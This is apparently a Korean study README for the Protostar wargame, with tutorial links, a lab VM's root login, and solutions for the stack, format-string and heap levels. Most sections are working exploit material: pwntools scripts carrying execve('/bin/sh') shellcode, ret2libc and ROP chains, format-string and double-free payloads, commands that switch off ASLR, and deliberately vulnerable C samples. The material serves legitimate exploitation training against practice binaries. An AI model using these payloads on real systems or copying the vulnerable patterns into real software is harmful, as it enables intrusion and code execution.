# gdbProject

# 필수 선수 과정
- https://www.youtube.com/watch?v=jyOoUxzrtTw
- https://www.youtube.com/watch?v=DvuWTPqmD8I

### 프로토스타 이미지 다운로드
ID: root
PW: godmode
- https://drive.google.com/file/d/1ppZQxJy_8a9Q2as7ZlFd0vxzFajA2byM/view?usp=sharing 

### bin.tar 파일 다운로드
- https://drive.google.com/file/d/1KtAtxk3FNSZZoxZhf4bGWN0uMdHNvOCB/view?usp=sharing 

### 레나 튜토리얼 1번,2번  (어셈블리어 기초)
- https://www.youtube.com/playlist?list=PLnIaYcDMsScxpiB8VpGhM4-NtovcM_uB9

### double free
- http://www.hackerschool.org/HS_Boards/data/Lib_system/dfb_leon.txt

### 프로토스타 format string bug
- https://exploit-exercises.com/protostar/

### pwn 사용 튜토리얼(telnet 접속해서 echo하기)
https://www.youtube.com/watch?v=anKJKi7e4HM

=======================================================

프로토스타 - 3. stack0 다른 변수 덮어씌우기

스택 공격에 취약한 컴파일 명령어

>gcc -o stack0 stack0.c

>gcc -z execstack -no-pie -w -o stack0 stack0.c

python -c "print('a'*80)"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


>modified = 0x7fffffffe180 - 0x4

=======================================================

프로토스타 - 4. stack1 원하는 스택 바꾸기

>buffer = rbp-0x50

>modified = rbp-0x4

A 76개 넣으면 modified까지 간다! BBBB

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba

=======================================================

프로토스타 - 5. stack2 Peda 입문, 그리고 환경 스택 BoF

peda 다운로드 사이트
https://github.com/longld/peda

리눅스 환경변수 설정

>export GREENIE='AAAAA'

peda에서 패턴 만들기
>pattern create 100

>b *main+89

peda에서 패턴 오프셋 확인하기

>gdb-peda$ pattern offset 0x41413341

>1094792001 found at offset: 68

Exploit 코드

>export GREENIE=$(python -c 'print "A"*68 + "\x0a\x0d"*4')

=======================================================

프로토스타 - 6. stack3 pwn 사용해서 공격하기(return2lib)

win 함수 주소
>win_addr = 0x0000000000400577

페다에서 패턴 오프셋 확인하기
>gdb-peda$ pattern offset 0x4134414165414149
>4698452060381725001 found at offset: 72

파이썬 코드
'''
from pwn import *

p = process('./stack3')
win_addr = p64(0x0000000000400577)
payload = 'A'*72 + win_addr

p.sendline(payload)
print p.recvrepeat(1)

=======================================================

프로토스타 - 7. stack4 return 덮어씌워서 코드 흐름 바꾸기

'''
from pwn import *

winaddr = p64(0x0000000000400537)
payload = 'A' * 72 + winaddr

p = process(['./stack4'])
p.sendline(payload)
print p.recvrepeat(1)

=======================================================

프로토스타 - 8. stack5 쉘코드 생성, 리눅스 어태치 방법

칼리리눅스 ASLR 끄기
>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

어태치 방법
1. pwn 프로그램에 pause()를 사용해서 잠시 멈춘다.
2. gdb ./stack5 (pid)
3. 디버깅 하고 싶은 부분에 break를 건다. b *main+38
4. conti 디버거를 계속 실행 시킨다.
5. pwn 프로그램에 엔터를 누른다. (sendline)
6. 익스플로잇이 성공했는지 확인한다.

'''!stack5.py
from pwn import *

buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

retaddr = p64(0x7fffffffe1f0)
payload = 'A' * 72 + retaddr + buf

p = process(['./stack5'])
pause()
p.sendline(payload)
print p.recvrepeat(1)

p.interactive()

=======================================================

프로토스타 - 9. stack5 또다른 해결 방법 ret2lib

칼리에서 32bit 프로그램 실행을 위한 라이브러리
sudo apt install lib32z1


파이썬 코드
'''stack5.py

from pwn import * 

system = p32(0xf7e117e0)
dummy  = p32(0xFFFFFFFF)
bin_sh = p32(0xf7f50968)
offset = 76

payload = 'A'*offset + system + dummy + bin_sh

p = process(['stack5'])
p.sendline(payload)
p.interactive()

=======================================================

프로토스타 - 10. stack6 함정을 지나 ret하기

칼리에서 32bit 프로그램 실행을 위한 라이브러리
sudo apt install lib32z1

ret and 0xbf000000 == 0xbf000000

'''stack6.py

from pwn import * 

system = p32(0xf7e117e0)
dummy  = p32(0xFFFFFFFF)
bin_sh = p32(0xf7f50968)
offset = 80

payload = 'A'*offset + system + dummy + bin_sh

p = process(['stack6'])
p.sendline(payload)
p.interactive()

=======================================================

프로토스타 - 11. stack7 jmpcall을 사용한 우회 방법

칼리리눅스 ASLR 끄기
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

'''stack7.py

from pwn import * 

buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"


system = p64(0x7ffff7e345d0)
dummy  = p64(0xFFFFFFFFFFFFFFFF)
bin_sh = p64(0x7ffff7f70573)
jmp_rsp = p64(0x4007f3)
offset = 88

payload = 'A'*offset + system + dummy + bin_sh

payload = 'A'*offset + jmp_rsp + buf

p = process(['stack7'])
p.sendline(payload)
p.interactive()

=======================================================

프로토스타 - 12. stack7 ROP 기초를 이용한 우회 방법

칼리리눅스 ASLR 끄기
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space


'''stack7.py

from pwn import * 

system = p32(0xf7e117e0)
dummy  = p32(0xFFFFFFFF)
bin_sh = p32(0xf7f50968)
ret    = p32(0x8048362)
offset = 80

payload = 'A'*offset + ret + system + dummy + bin_sh

p = process(['stack7'])
p.sendline(payload)
p.interactive()

=======================================================

프로토스타 - 13. 포맷 스트링 버그(format string bug)로 무엇을 할 수 있나 - 1. 허용되지 않은 데이터 읽어내기

'''format_printf.c

int main()
{
 printf("%d %d %d %d", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10);
 return 0;
}

// format_gets.c
int main()
{ 
 char buf[64];
 gets(buf);
 printf(buf);
 return 0;
}

=======================================================

프로토스타 - 14. 포맷 스트링 버그(format string bug)로 무엇을 할 수 있나 - 2. 허용되지 않은 데이터 쓰기

프로토스타 format string bug
https://exploit-exercises.com/protostar/

''' format_printf_n
int main()
{ 
 int a = 0;
 printf(".....%n",&a);

 if(a!=0)
 {
  printf("code detection %d\n", a);
 }
  
 return 0;
}

=======================================================

프로토스타 - 15. format0 sprintf 오버플로우

> ./format0 $(python -c "print '%64d' + '\xef\xbe\xad\xde'") '''

=======================================================
프로토스타 - 16. format1 코드 흐름 변조

> ./format1 $(python -c "print 'AAAA' + '\x38\x96\x04\x08' + '%x.'*154" + '%n.') 

=======================================================
프로토스타 - 17. format2 정확한 작은 수 만들기

=======================================================
프로토스타 - 18. format3 정확한 큰 수 만들기

=======================================================
프로토스타 - 19. format4 GOT 덮어쓰기를 활용한 Exploit

=======================================================
프로토스타 - 20. heap0 Heap 구조 분석과 힙 오버플로우(Heap Over flow)

### 힙 관리 
https://www.syslinux.org/wiki/index.php?title=Heap_Management

### 스택 vs. 힙

정적 메모리 동적 메모리
push []       프로그래머에 의해서 관리
작은  큰 (malloc, class)
주소:아래서 위로 주소:위에서 아래로
EBP//ESP  헤더

- 칼리 ASLR disable
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

- data 헤더 주소
> x/10wx 0x804a160 - 0x8

- 메모리 주소 구하기
> 1b0 - 160

- winner의 주소
> 0x8048464

> ./heap0 $(python -c "print 'A' * 80 + '\x64\x84\x04\x08' ")

=======================================================
프로토스타 - 21. heap1 더블 strcpy를 활용한 익스플로잇 시나리오

- 칼리 ASLR disable
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

- printf의 got주소
> 0x08049774

- winner의 주소
> 0x8048494

- 힙의 주소
> x/100wx 0x804a160 - 0x8

> ./heap1 $(python -c "print 'A' * 20 + '\x74\x97\x04\x08'  + ' BBBB'")

> ./heap1 $(python -c "print 'A' * 20 + '\x74\x97\x04\x08'  + ' \x94\x84\x04\x08'")

=======================================================
프로토스타 - 22. heap2 UAF(Use After Free) 취약점을 활용한 변수 변조

> gdb-peda$ b *main+127

> gdb-peda$ b *main+297

> gdb-peda$ b *main+346

> x/30xw 0x804c818 - 8

=======================================================
프로토스타 - 23. UAF(Use After Free) 심화: 쉘코드 실행

샤의 공간 (블로그)
http://shayete.tistory.com/entry/7-Use-After-Free

- 힙의 위치
> x/100wx 0x804b160 - 0x8

- 패턴 생성
> pattern create 150

'''! uaf1.py
from pwn import *

offset = 46
bin_sh = p32(0x08048612)
payload = 'A' * offset + bin_sh
pattern = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'

p = process('uaf')
print p.recvrepeat(1)
p.sendline('gasbugs')
print p.recvrepeat(1)
pause()
p.sendline(payload)
p.interactive()

=======================================================

프로토스타 튜토리얼 - 24. DFB(Double Free bug) 이해와 실습

Live over flow Heap3
http://liveoverflow.com/binary_hacking/protostar/heap3.html

once upon a free()
http://phrack.org/issues/57/9.html

머신코드 만들기
https://defuse.ca/online-x86-assembler.htm#disassembly

Double Free Bug
http://www.hackerschool.org/HS_Boards/data/Lib_system/dfb_leon.txt

- 힙 정보 보기
> x/80wx 0x804c008 - 8

- 첫 번째 시도
> run AAAA `python -c "print 'B'*36 + '\x65' "` CCCC

- 두 번째 시도
> run AAAA `python -c "print 'B'*36 + '\x65' "` `python -c "print 'A'*92 + '\xfc\xff\xff\xff' * 2 + '\xfd\xfd\xfd\xfd' + '\xbd\xbd\xbd\xbd'"`

- 세 번째 시도

> fd = 0x0804B11C

> bd = 0x08048864

> run AAAA `python -c "print 'B'*36 + '\x65' "` `python -c "print 'A'*92 + '\xfc\xff\xff\xff' * 2 + '\x1C\xB1\x04\x08' + '\x64\x88\x04\x08'"`


- 네 번째 시도

> 머신코드 징검다리 넣기: B864880408FFD0

run `python -c "print 'A'*8 + '\xB8\x64\x88\x04\x08\xFF\xD0'"` `python -c "print 'B'*36 + '\x65' "` `python -c "print 'A'*92 + '\xfc\xff\xff\xff' * 2 + '\x1C\xB1\x04\x08' + '\x10\xc0\x04\x08'"`

=======================================================

프로토스타 튜토리얼 - 25. Net0 Exploit 네트워크 시작하기

Net0 - LiveOverflow
http://liveoverflow.com/binary_hacking/protostar/net0.html

=======================================================

프로토스타 튜토리얼 - 26. Net1 바이너리 데이터 처리

Net1 - LiveOverflow
http://liveoverflow.com/binary_hacking/protostar/net1.html

=======================================================

프로토스타 튜토리얼 - 27. Net2 바이너리 배열 처리

Net2 - LiveOverflow
http://liveoverflow.com/binary_hacking/protostar/net2.html
=======================================================
